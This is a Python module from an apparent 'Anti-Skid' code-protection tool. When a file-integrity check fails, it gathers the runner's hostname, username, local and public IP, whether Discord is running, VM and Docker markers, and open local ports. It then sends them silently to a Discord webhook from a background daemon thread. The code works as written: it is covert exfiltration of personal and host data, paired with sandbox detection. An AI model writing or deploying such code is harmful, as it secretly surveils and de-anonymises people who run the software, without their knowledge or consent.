"""
Anti-Skid :: Telemetry / Breach Reporter
Builds a structured diagnostic report and exfiltrates it to a Discord webhook.
Non-blocking (asynchronous in a daemon thread).
"""

import json
import os
import sys
import threading
import traceback
import urllib.request
import datetime
from typing import Optional

from .integrity import AuditResult
from .environment import collect_environment_report

# ---------------------------------------------------------------------------
# Report builder
# ---------------------------------------------------------------------------

MAX_FIELD_LENGTH = 1000  # Discord embed field value cap


def _truncate(text: str, max_len: int = MAX_FIELD_LENGTH) -> str:
    """Truncate text and append a notice if too long."""
    if len(text) <= max_len:
        return text
    return text[: max_len - 30] + "\n\n... [truncated by Anti-Skid]"


def _format_mismatch_table(mismatches: list) -> str:
    """Format hash mismatches into a compact ASCII block."""
    if not mismatches:
        return "None"
    lines = []
    for m in mismatches:
        lines.append(f"• {m['path']}")
        lines.append(f"  Expected: {m['expected'][:16]}...")
        lines.append(f"  Actual:   {m['actual'][:16]}...")
        lines.append("")
    return _truncate("\n".join(lines))


def build_breach_report(audit: AuditResult) -> str:
    """
    Compose the breach telemetry report as a human-readable .txt artifact.

    Parameters
    ----------
    audit : AuditResult from integrity.verify_integrity()

    Returns
    -------
    str : formatted report text
    """
    now = datetime.datetime.utcnow().isoformat() + "Z"

    # Gather environment data
    env_info = collect_environment_report()
    host = env_info.get("host", {})
    ports = env_info.get("ports", {})
    discord = env_info.get("discord_process", "N/A")
    container_vm = env_info.get("container_vm", {})

    sections = []

    sections.append("=" * 64)
    sections.append("  ANTI-SKID :: BREACH TELEMETRY REPORT")
    sections.append("=" * 64)
    sections.append(f"Timestamp (UTC)     : {now}")
    sections.append(f"Integrity Passed    : {audit['passed']}")
    sections.append(f"Audit Duration (ms) : {audit['elapsed_ms']}")
    sections.append(f"Total Baseline Files: {audit['total_files']}")
    sections.append(f"Matched             : {audit['matched']}")
    sections.append(f"Mismatches          : {len(audit['mismatches'])}")
    sections.append(f"Missing Files       : {len(audit['missing'])}")
    sections.append(f"New / Unknown Files : {len(audit['new_files'])}")

    if audit.get("error"):
        sections.append(f"\n!! AUDIT ERROR: {audit['error']}")

    # --- File Integrity Audit -----------------------------------------------
    sections.append("\n" + "-" * 64)
    sections.append("  FILE INTEGRITY AUDIT (Hash Mismatches)")
    sections.append("-" * 64)
    sections.append(_format_mismatch_table(audit["mismatches"]))

    if audit.get("missing"):
        sections.append("\n--- MISSING FILES ---")
        for m in audit["missing"]:
            sections.append(f"  • {m}  [DELETED OR RENAMED]")

    if audit.get("new_files"):
        sections.append("\n--- NEW / UNTRACKED FILES ---")
        for nf in audit["new_files"]:
            sections.append(f"  • {nf}")

    # --- Host Diagnostics ---------------------------------------------------
    sections.append("\n" + "-" * 64)
    sections.append("  HOST DIAGNOSTICS")
    sections.append("-" * 64)
    sections.append(f"Hostname      : {host.get('hostname', 'N/A')}")
    sections.append(f"Username      : {host.get('username', 'N/A')}")
    sections.append(f"Local IP      : {host.get('local_ip', 'N/A')}")
    sections.append(f"Public IP     : {host.get('public_ip', 'N/A')}")
    sections.append(f"Platform      : {host.get('platform', 'N/A')}")
    sections.append(f"Python        : {host.get('python_version', 'N/A')}")

    # --- Environment Markers ------------------------------------------------
    sections.append("\n" + "-" * 64)
    sections.append("  ENVIRONMENT MARKERS")
    sections.append("-" * 64)
    sections.append(f"Discord Running : {discord}")

    # Container / VM
    cv = container_vm
    sections.append(f"Docker Env File : {cv.get('docker_env_file', False)}")
    sections.append(f"Docker CGroup   : {cv.get('docker_cgroup', False)}")
    sections.append(f"VirtualBox      : {cv.get('vbox', False)}")
    sections.append(f"VMware          : {cv.get('vmware', False)}")
    sections.append(f"QEMU            : {cv.get('qemu', False)}")

    # --- Port Status ------------------------------------------------
    sections.append("\n" + "-" * 64)
    sections.append("  PORT STATUS (127.0.0.1)")
    sections.append("-" * 64)
    port_lines = []
    for port_label, status in sorted(ports.items()):
        port_lines.append(f"  {port_label:<20} {status}")
    sections.append("\n".join(port_lines) if port_lines else "  (none)")

    sections.append("\n" + "=" * 64)
    sections.append("  END OF REPORT")
    sections.append("=" * 64)

    return "\n".join(sections)


# ---------------------------------------------------------------------------
# Discord webhook delivery (non-blocking)
# ---------------------------------------------------------------------------


def _send_to_discord(webhook_url: str, report_text: str) -> bool:
    """
    Push the breach report to a Discord webhook as a file attachment.
    Uses Discord's webhook API with multipart/form-data.
    """
    boundary = "----AntiSkidBoundary"

    # Build multipart body manually to attach a .txt file
    payload_parts = []

    # JSON payload part (required by Discord)
    payload_json = json.dumps({
        "content": ":warning: **ANTI-SKID BREACH DETECTED**",
        "username": "Anti-Skid Sentinel",
    })
    payload_parts.append(f"--{boundary}")
    payload_parts.append('Content-Disposition: form-data; name="payload_json"')
    payload_parts.append("Content-Type: application/json")
    payload_parts.append("")
    payload_parts.append(payload_json)

    # File part
    timestamp = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = f"anti_skid_breach_{timestamp}.txt"
    payload_parts.append(f"--{boundary}")
    payload_parts.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
    payload_parts.append("Content-Type: text/plain")
    payload_parts.append("")
    payload_parts.append(report_text)

    payload_parts.append(f"--{boundary}--")
    payload_parts.append("")

    body_bytes = "\r\n".join(payload_parts).encode("utf-8")

    content_type = f"multipart/form-data; boundary={boundary}"

    req = urllib.request.Request(
        webhook_url,
        data=body_bytes,
        headers={
            "Content-Type": content_type,
            "User-Agent": "Anti-Skid/1.0",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return 200 <= resp.status < 300
    except Exception:
        return False


def report_breach(
    webhook_url: Optional[str],
    audit: AuditResult,
) -> None:
    """
    Build the breach report and fire it to the Discord webhook asynchronously.

    If *webhook_url* is None or empty, the report is printed to stderr instead.

    Parameters
    ----------
    webhook_url : str or None
        Discord webhook URL.  If None, falls back to ANTI_SKID_WEBHOOK env var.
    audit : AuditResult
        The result from verify_integrity().
    """
    # Resolve webhook URL
    if not webhook_url:
        webhook_url = os.environ.get("ANTI_SKID_WEBHOOK")

    report_text = build_breach_report(audit)

    if not webhook_url:
        print(
            "\n[Anti-Skid] No webhook configured.  Breach report follows:\n",
            file=sys.stderr,
        )
        print(report_text, file=sys.stderr)
        return

    # Fire-and-forget in a daemon thread
    def _task():
        success = _send_to_discord(webhook_url, report_text)
        if not success:
            print(
                "[Anti-Skid] WARNING: Failed to deliver telemetry to webhook.",
                file=sys.stderr,
            )

    t = threading.Thread(target=_task, daemon=True, name="anti-skid-telemetry")
    t.start()